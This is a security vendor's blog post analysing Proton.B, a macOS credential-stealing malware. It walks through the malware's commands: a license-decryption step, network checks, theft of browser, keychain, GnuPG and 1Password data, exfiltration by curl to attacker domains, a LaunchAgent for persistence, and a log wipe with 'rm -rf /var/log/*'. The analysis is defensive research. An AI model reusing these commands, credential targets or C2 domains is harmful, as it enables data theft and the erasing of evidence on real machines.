<p><span style="font-weight: 400;">Tty_tickets is a feature that is enabled by default since macOS Sierra. The purpose of tty_tickets (when enabled) is to ask users for their password every time they execute a </span><i><span style="font-weight: 400;">‘sudo’ </span></i><span style="font-weight: 400;">command in a separate terminal. If disabled, users only have to enter their password once when running </span><i><span style="font-weight: 400;">‘sudo’</span></i><span style="font-weight: 400;"> and it will be valid for any new terminal (tty) that the users execute a </span><i><span style="font-weight: 400;">‘sudo’ </span></i><span style="font-weight: 400;">command in. My assumption is that tty_tickets is being disabled to make it easy for the malware authors’ scripting tasks; it’s easier to input a password once rather than several times in different terminals.</span></p>
<p><span style="font-weight: 400;">When looking at the strings section of activity_agent in IDA pro, we immediately spot a public key.</span></p>
<p><a href="https://cdn2.hubspot.net/hubfs/3354902/Imported_Blog_Media/image1-1.jpg"><img class="alignnone wp-image-8779" src="https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image1-1.jpg?width=777&amp;height=175&amp;name=image1-1.jpg" alt="" width="777" height="175" srcset="https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image1-1.jpg?width=389&amp;height=88&amp;name=image1-1.jpg 389w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image1-1.jpg?width=777&amp;height=175&amp;name=image1-1.jpg 777w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image1-1.jpg?width=1166&amp;height=263&amp;name=image1-1.jpg 1166w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image1-1.jpg?width=1554&amp;height=350&amp;name=image1-1.jpg 1554w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image1-1.jpg?width=1943&amp;height=438&amp;name=image1-1.jpg 1943w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image1-1.jpg?width=2331&amp;height=525&amp;name=image1-1.jpg 2331w" sizes="(max-width: 777px) 100vw, 777px"></a></p>
<p><span style="font-weight: 400;">That key is being used in the following command line:</span></p>
<table>
<tbody>
<tr>
<td><i><span style="font-weight: 400;">'/bin/sh', '-c', "echo '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwUP19DdW2NlkkdovqqwF\n+r3sBaamka42zVMGa+COUCIysrVhVJIv4nmc57TLxgG8dsg+G0o0NQ75n898b04l\nYGve3gXGWJ8Y5OTJ16+RA4OtKAiO8v7qEGnQ/QpSzrLZPU3Yd60bAltYSvCCiOdB\nOKhOAiag0H39F2k5ea4zxt6TNDksW/o3+HcjzA4yy+C1tp2Cr4X37O5XMVZPWpMk\nsIXPazh91tr0TJ2VFyx4btnDPajeOzhcKUA05Wrw+hagAZnFU9Bajx3KvdTlxsVx\nLmRc5r3IqDAsXTHH1jpmWMDiC9IGLDFPrN6NffAwjgSmsKhi1SC8yFHh0oPCswRh\nrQIDAQAB\n-----END PUBLIC KEY-----' &gt; /tmp/public.pem; openssl rsautl -verify -in /Users/test/Downloads/Proton/Proton.B/activity_agent.app/Contents/Resources/.tmpdata -pubin -inkey</span></i>
<p><i><span style="font-weight: 400;">/tmp/public.pem; openssl rsautl -verify -in /Users/test/Downloads/Proton/Proton.B/activity_agent.app/Contents/Resources/.tmpdata -pubin -inkey</span></i></p>
</td>
</tr>
</tbody>
</table>
<p><span style="font-weight: 400;">The key is being saved in a file called /tmp/public.pem. Once the key is saved, the malware then decrypts a file called .tmpdata, which also resides in the </span><i><span style="font-weight: 400;">Resources</span></i><span style="font-weight: 400;"> directory of the bundle (</span><strong>Note: In POSIX filesystems such as in macOS and Linux, prepending a file name with a “.” means that it’s hidden</strong><span style="font-weight: 400;">).</span></p>
<p>The decrypted file, .tmpdata, contains the malware’s “license” in a JSON format. The license data is its “expiration date” and various checksums.</p>
<table>
<tbody>
<tr>
<td><i><span style="font-weight: 400;">{"expiration_date":"2017-05-10 23:59:59 +0000","grace_period":"25","bundle_name":"chameleo","os_version":"10.x","checksum":"128814f2b057aef1dd3e00f3749aed2a81e5ed03737311f2b1faab4ab2e6e2fe"} </span></i></td>
</tr>
</tbody>
</table>
<p><span style="font-weight: 400;">The malware then conducts a test to see if it’s connected to the Internet by establishing a TCP connection to 8.8.8.8 (Google’s DNS server) for 20 seconds.</span></p>
<table>
<tbody>
<tr>
<td><i><span style="font-weight: 400;">'/bin/sh', '-c', 'nc -G 20 -z 8.8.8.8 53 &nbsp;&gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo success'</span></i><span style="font-weight: 400;">. </span></td>
</tr>
</tbody>
</table>
<p>The malware also tries to connect to several other domains from the following list:</p>
<ul>
<li style="font-weight: 400;"><span style="font-weight: 400;">handbrakestore.com</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">handbrake.cc</span></li>
<li style="font-weight: 400;"><span style="color: #ff0000;"><span style="font-weight: 400;">luwenxdsnhgfxckcjgxvtugj.com</span>&nbsp;</span></li>
<li style="font-weight: 400;"><span style="color: #ff0000;"><span style="font-weight: 400;">6gmvshjdfpfbeqktpsde5xav.com</span>&nbsp;</span></li>
<li style="font-weight: 400;"><span style="color: #ff0000;"><span style="font-weight: 400;">kjfnbfhu7ndudgzhxpwnnqkc.com</span>&nbsp;</span></li>
<li style="font-weight: 400;"><span style="color: #ff0000;"><span style="font-weight: 400;">yaxw8dsbttpwrwlq3h6uc9eq.com</span>&nbsp;</span></li>
<li style="font-weight: 400;"><span style="color: #ff0000;"><span style="font-weight: 400;">qrtfvfysk4bdcwwwe9pxmqe9.com</span>&nbsp;</span></li>
<li style="font-weight: 400;"><span style="color: #ff0000;"><span style="font-weight: 400;">fyamakgtrrjt9vrwhmc76v38.com</span>&nbsp;</span></li>
<li style="font-weight: 400;"><span style="color: #ff0000;"><span style="font-weight: 400;">kcdjzquvhsua6hlfbmjzkzsb.com</span>&nbsp;</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400; color: #ff0000;">Ypu4vwlenkpt29f95etrqllq.com</span></li>
</ul>
<p><strong>Note</strong><span style="font-weight: 400;">: The domains in red were not registered at the time of my research, although they were registered last night by an unknown entity. They seem to be back up domains in case one of the first two stops working.</span></p>
<p><span style="font-weight: 400;">After that, the malware checks for the time and date but interestingly enough, it appears that it does not trust the settings on the machine that it’s on running (because nasty researchers like us can mess with the local clock) and contacts an external service that’s hosted on Google. The malware obtains the time and date by creating a new environment variable called </span><i><span style="font-weight: 400;">$hcresult</span></i><span style="font-weight: 400;"> that contains what’s being returned by sending an HTTP request to the Google hosted link by executing this command:</span></p>
<table>
<tbody>
<tr>
<td><i><span style="font-weight: 400;">hcresult=`curl -sL https://script.google.com/macros/s/AKfycbyd5AcbAnWi2Yn0xhFRbyzS4qMq1VucMVgVvhul5XqS9HkAyJY/exec`</span></i></td>
</tr>
</tbody>
</table>
<p>The program then continues to check if a file in the following path: ~/Library/VideoFrameworks/.ptrun (notice the “.” before the file name, which makes it hidden) exists and notes that Proton.B’s installation process is working.</p>
<p><span style="font-weight: 400;">Once the malware sees that the license is still valid, it </span><span style="font-weight: 400;">creates a new directory called ~/Library/Renderfiles, copies its own bundle to this directory and then deletes its entire bundle from where it was initially executed.</span></p>
<p>Afterwards, it creates another directory - ~/Library/VideoFrameworks. This directory will store all of the stolen data that will soon be exfiltrated to the attackers.</p>
<p>The credentials that are being stolen, according to my research, were:</p>
<ul>
<li style="font-weight: 400;"><span style="font-weight: 400;">Google Chrome profile and all saved data, including cookies, saved form data and passwords</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">Safari profile and all saved data, including &nbsp;cookies, saved form data and passwords</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">Firefox profile and all saved data, including &nbsp;cookies, saved form data and passwords</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">Opera profile and all saved data, including &nbsp;cookies, saved form data and passwords</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">Multiple keychains </span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">1Password data vaults</span></li>
</ul>
<p><a href="https://cdn2.hubspot.net/hubfs/3354902/Imported_Blog_Media/image2-4.png"><img class="alignnone wp-image-8780" src="https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image2-4.png?width=867&amp;height=102&amp;name=image2-4.png" alt="" width="867" height="102" srcset="https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image2-4.png?width=434&amp;height=51&amp;name=image2-4.png 434w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image2-4.png?width=867&amp;height=102&amp;name=image2-4.png 867w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image2-4.png?width=1301&amp;height=153&amp;name=image2-4.png 1301w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image2-4.png?width=1734&amp;height=204&amp;name=image2-4.png 1734w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image2-4.png?width=2168&amp;height=255&amp;name=image2-4.png 2168w, https://www.cybereason.com/hs-fs/hubfs/Imported_Blog_Media/image2-4.png?width=2601&amp;height=306&amp;name=image2-4.png 2601w" sizes="(max-width: 867px) 100vw, 867px"></a></p>
<p><span style="font-weight: 400;">Every repository of passwords will be saved in a zip file:</span></p>
<ul>
<li style="font-weight: 400;"><span style="font-weight: 400;">Chrome data will be stored in CR_def.zip</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">Firefox data will be stored in FF.zip</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">Opera data will be stored in OP.zip</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">Keychain data (from /Library/Keychains and ~/Library/keychain) will be stored in KC.zip</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">Gnupg and 1Password data from the following directories will be stored in GNU_PW.zip:</span>
<ul>
<li style="font-weight: 400;"><span style="font-weight: 400;">~/.gnupg</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">~/Library;/Application support/1Password 4</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">~/Library;/Application support/1Password 3.9</span></li>
</ul>
</li>
</ul>
<p>All of that data will be zipped again to a file called Proton.zip. This file will be saved in the ~/Library/VideoFrameworks directory, which will then be exfiltrated to the attackers.</p>
<p><span style="font-weight: 400;">Once all of the credentials are zipped, they are transmitted to the attackers using </span><i><span style="font-weight: 400;">‘curl’ </span></i><span style="font-weight: 400;">to the url: </span><i><span style="font-weight: 400;">http://api.handbrake.biz/api/init</span></i></p>
<p><a href="https://static.hsstatic.net/BlogImporterAssetsUI/ex/missing-image.png" data-originalsrc="https://www.cybereason.com/wp-content/uploads/2017/05/image5.png"><img class="alignnone wp-image-8781" src="https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%2012.png?width=1651&amp;name=asset%2012.png" alt="asset 12.png" width="1651" data-originalsrc="https://www.cybereason.com/wp-content/uploads/2017/05/image5.png" title="asset 12.png" caption="false" data-constrained="true" style="width: 1651px;" srcset="https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%2012.png?width=826&amp;name=asset%2012.png 826w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%2012.png?width=1651&amp;name=asset%2012.png 1651w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%2012.png?width=2477&amp;name=asset%2012.png 2477w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%2012.png?width=3302&amp;name=asset%2012.png 3302w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%2012.png?width=4128&amp;name=asset%2012.png 4128w, https://www.cybereason.com/hs-fs/hubfs/Blog%20Images%20-%20Labs/proton%20B/asset%2012.png?width=4953&amp;name=asset%2012.png 4953w" sizes="(max-width: 1651px) 100vw, 1651px"></a></p>
<p><span style="font-weight: 400;">After all the zip files are created, the malware executes several </span><i><span style="font-weight: 400;">killall</span></i><span style="font-weight: 400;"> commands and terminates these applications:</span></p>
<ul>
<li style="font-weight: 400;"><span style="font-weight: 400;">Console</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">Terminal</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">Wireshark</span></li>
</ul>
<p>This step makes it hard for researchers to analyze this malware when it runs since all of these programs will be terminated unexpectedly. A simple workaround is to simplee <i>tee</i> the logs to another file, use iTerm instead of Terminal and tcpdump or Tshark instead of Wireshark&nbsp;<span style="font-weight: 400;">¯\_(ツ)_/¯.</span></p>
<p>After terminating the aforementioned processes, the malware copies its own bundle to ~/Library/RenderFiles/activity_agent.app. It then adds the following LaunchAgents to achieve persistence on the machine: ~/Library/LaunchAgents/fr.handbrake.actibity_agent.plist.</p>
<p>And, of course, no malicious execution of malware is complete without the removal of logs. Proton.B does that by executing this command:</p>
<table style="width: 343px; height: 57px;">
<tbody>
<tr>
<td style="width: 333px;"><i><span style="font-weight: 400;"> sudo -S rm -rf /var/log/* /Library/Logs/*</span></i></td>
</tr>
</tbody>
</table>
<h2><strong>Affected by Proton? Change your passwords</strong></h2>
<p>Most of the Mac malware that’s out there is adware or rather simple campaigns. This is the first time researchers have had a live malware sample to play with and see its inner workings. Sadly, on the environment that I was testing the malware in, I couldn’t see any interactive command executions or any new connections that were initialized by the attackers to my research machine. I am sure that there is more to Proton.B than this blog post covers. If you think you’ve been hit by Proton, change all of your passwords everywhere and assume that all of your credentials have been compromised.</p>
<p><span style="font-weight: 400;">I’d like to recognize Thomas Reed, Pepijn Bruienne and the other good folks from the </span><a href="http://macadmins.org" target="_blank" rel="noopener noreferrer"><span style="font-weight: 400;">MacAdmins</span></a><span style="font-weight: 400;"> Slack group who provided helpful pointers and clarifications.</span></p></span>
          
          
          <!-- CONDITIONAL Author Box Display -->
            <div class="container columns cr-mln__author-listing-single">
              
                <div class="column headshot is-3-full-hd is-3-desktop is-3-tablet is-12-mobile">
                  <img class="cr-speaker-headshot" src="https://www.cybereason.com/hubfs/AmitSerper2017.png" alt="Amit Serper">
                </div>
              
              <div class="column is-9-full-hd is-9-desktop is-12-mobile">
                <span class="descriptor">About the Author</span>
                <h4>Amit Serper</h4>
                
                
                  <a class="social" href="https://twitter.com/0xAmit" target="_blank">
                    <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/icon-social-gray-twitter.svg">
                  </a>
                
                
                  <p>Amit Serper is&nbsp;Principal Security Researcher at Cybereason.&nbsp;He specializes in low-level, vulnerability and kernel research, malware analysis and reverse engineering on Windows, Linux and macOS.</p>
                
                
              </div>            
            </div>
          
        <!-- CONDITIONAL Post Type Choices -->
        
        <!-- Malicious Life Post -->
        
        
        <!-- CISO Stories -->
        
        <!-- Webinar -->
        
          
        <!-- CONDITIONAL Transcript -->
          
        
      </div>
       
    </div>
  </div>
</div></div>

</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-2 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="display: none;" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1616011887658867" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><section class="cr-malicious-life-network__blog-listing related-posts__wrapper">
    <h3>Related Posts</h3>
  <div class="container container-is-blog columns is-multiline page-center">
      
          
          
          
          
      
  </div>
</section>
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-3 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_161767462015235" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-blog_subscribe" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="cr-mln__blog-listing-page__subscribe-footer">
  <div class="container container-is-blog columns page-center">
    <div class="column is-8-fullhd is-8-desktop is-10-tablet is-12-mobile">
      <span class="tag">NEWSLETTER</span>
      <h3>Never miss a blog</h3>
      <p>Get the latest research, expert insights, and security industry news.</p>
      <a class="cr-button cr-mln__subscribe" href="#blog-subscribe">Subscribe</a>
    </div>
    <!--<div class="column is-5-fullhd is-5-desktop is-half-tablet is-12-mobile is-offset-1-fullhd is-offset-1-desktop">
      <div class="inputs-wrapper">
        
        
      </div>
    </div>-->
  </div>
</div>
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end body -->
</div><!--end body wrapper -->

<div class="footer-container-wrapper">
    <div class="footer-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_16036762394194314" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><!-- FOOTER -->

<footer class="cr-section cr-footer cr-footer__full">
    <div class="container page-center">
      <div class="columns">
          <div class="column is-6-fullhd is-5-desktop cr-footer__col cr-footer__left">
            <div class="cr-footer__Left-logo">
              <a href="https://www.cybereason.com">
                <img src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-logo-web-horizontal-white-500px.png">
              </a>
            </div>
          </div>
          <div class="columns column is-6-fullhd is-6-desktop cr-footer__col cr-footer__right">
            <div class="cr-footer__links-list column">
              <h4>About</h4>
              <ul>
                <li><a href="https://www.cybereason.com/company/who-we-are">Who We Are</a>
                </li><li><a href="https://www.cybereason.com/company/careers">Careers</a>
                </li><li><a href="https://www.cybereason.com/company/leadership-and-advisory-board">Leadership</a>
                </li><li><a href="https://www.cybereason.com/company/contact-us">Contact</a>
              </li></ul>
            </div>
            <div class="cr-footer__links-list column">
              <h4>Resources</h4>
              <ul>
                <li><a href="https://www.cybereason.com/blog">Blog</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/case-study">Case Studies</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/webinars">Webinars</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/white-papers">White Papers</a></li>
             </ul>
            </div>
            <div class="cr-footer__links-list column">
              <h4>Platform</h4>
              <ul>
                <li><a href="https://www.cybereason.com/platform">Overview</a></li>
                <li><a href="https://www.cybereason.com/platform/endpoint-prevention">Endpoint Protection</a></li>
                <li><a href="https://www.cybereason.com/platform/endpoint-detection-response-edr">EDR</a></li>
                <li><a href="https://www.cybereason.com/platform/managed-detection-response-mdr">MDR</a></li>
              </ul>
            </div>
          </div>
      </div>
    </div>
  
    <div class="container page-center">
      <div class="columns cr-footer__bottom-bar">
        <div class="column">
          <p>©Cybereason 2021. All Rights Reserved.</p>
        </div>
        <div class="column bottom-bar__links">
          <ul>
            <li><a href="https://www.cybereason.com/terms-of-use">Terms of Use</a></li>
            <li><a href="https://www.cybereason.com/privacy-notice">Privacy Notice</a></li>
            <li><a href="https://www.cybereason.com/security">Security</a></li>
            <!--<li><a href="#">Cookie Policy</a></li>-->
          </ul>
        </div>

        <div class="column bottom-bar__social">
          <ul>
            <li><a class="facebook" href="https://www.facebook.com/Cybereason/"></a></li>
            <li><a class="twitter" href="https://twitter.com/cybereason"></a></li>
            <li><a class="youtube" href="https://www.youtube.com/channel/UCOm7AaB0HiNH4Phe66sK0Ew"></a></li>
            <li><a class="linkedin" href="https://www.linkedin.com/company/cybereason"></a></li>
            <li><a class="instagram" href="https://www.instagram.com/cybereason"></a></li>
          </ul>
        </div>
    </div>
  </div>

</footer></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end footer -->
</div><!--end footer wrapper -->

    
<script>
(function () {
    window.addEventListener('load', function () {
        setTimeout(function () {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/_hcms/perf', true /*async*/);
            xhr.setRequestHeader("Content-type", "application/json");
            xhr.onreadystatechange = function () {
                // do nothing.
            };
            var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            function populateNetworkInfo(name, connection, info) {
                if (name in connection) {
                    info[name] = connection[name];
                }
            }
            var networkInfo = {};
            if (connection) {
                ['type', 'effectiveType', 'downlink', 'rtt'].forEach(function(name) {
                    populateNetworkInfo(name, connection, networkInfo);
                });
            }
            var perfData = {
                url: location.href,
                portal: 3354902,
                content: 5283507430,
                group: -1,
                connection: networkInfo,
                timing: performance.timing
            };
            xhr.send(JSON.stringify(perfData));
        }, 3000);  // Execute this 3 seconds after onload.
    });
})();
</script>

<script src="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/template_assets/42507089303/1614944819152/__CR_Web_Platform_2020/JS/animatedModal/animatedModal.min.js"></script>
<script>
if (typeof hsVars !== 'undefined') { hsVars['language'] = 'en'; }
</script>

<script src="/hs/hsstatic/cos-i18n/static-1.27/bundles/project.js"></script>
<script src="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/module_assets/41681847227/1619109182704/module_41681847227_CR_-_Malicious_Life_Network_--_Tier_One_Header.min.js"></script>
<script src="https://www.cybereason.com/hs-fs/hub/3354902/hub_generated/module_assets/41682410610/1618194602937/module_41682410610_CR_-_Malicious_Life_Network_--_Main_Hero.min.js"></script>

<!-- Start of HubSpot Analytics Code -->
<script type="text/javascript">
var _hsq = _hsq || [];
_hsq.push(["setContentType", "blog-post"]);
_hsq.push(["setCanonicalUrl", "https:\/\/www.cybereason.com\/blog\/labs-proton-b-what-this-mac-malware-actually-does"]);
_hsq.push(["setPageId", "5283507430"]);
_hsq.push(["setContentMetadata", {
    "contentPageId": 5283507430,
    "legacyPageId": "5283507430",
    "contentFolderId": null,
    "contentGroupId": 5272851739,
    "abTestId": null,
    "languageVariantId": 5283507430,
    "languageCode": "en",
    
}]);
</script>

<script type="text/javascript" id="hs-script-loader" async defer src="/hs/scriptloader/3354902.js"></script>
<!-- End of HubSpot Analytics Code -->


<script type="text/javascript">
var hsVars = {
    ticks: 1621735409839,
    page_id: 5283507430,

    content_group_id: 5272851739,
    portal_id: 3354902,
    app_hs_base_url: "https://app.hubspot.com",
    cp_hs_base_url: "https://cp.hubspot.com",
    language: "en",
    analytics_page_type: "blog-post",
    category_id: 3,
    folder_id: 0,
    is_hubspot_user: false
}
</script>


<script defer src="/hs/hsstatic/HubspotToolsMenu/static-1.103/js/index.js"></script>

<script>if ($('[id^="hs_form"]').length > 0) {
  var myInterval = setInterval(
  function() {
    var myFields = document.getElementsByClassName('hs-input');
    if (myFields.length > 0) {
      clearInterval(myInterval);
      for (var i = 0; i < myFields.length; i++) {
        var myField = myFields[i];
		var myTagName = myField.tagName.toLowerCase();
        if (myTagName == 'input' || myTagName == 'textarea') {
          if (myField.placeholder != null) {
            myField.placeholder = myField.placeholder.replace('*', '');
          }
        } else if (myTagName == 'select') {
          myField.options[0].innerHTML = myField.options[0].innerHTML.replace('*', '');
        }
      }
    }
  }, 100);
}
</script>

<div id="fb-root"></div>
 <script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&status=0";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
 <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
 


    <script>
function sticky_relocate() {
  var window_top = $(window).scrollTop();
  var div_top = $('#sticky-anchor').offset().top;
  if (window_top > div_top) {
    $('#sticky').addClass('stick');
  } else {
    $('#sticky').removeClass('stick');
  }
}

$(function() {
  $(window).scroll(sticky_relocate);
  sticky_relocate();
});
</script>
    <!-- Generated by the HubSpot Template Builder - template version 1.03 -->

</body></html>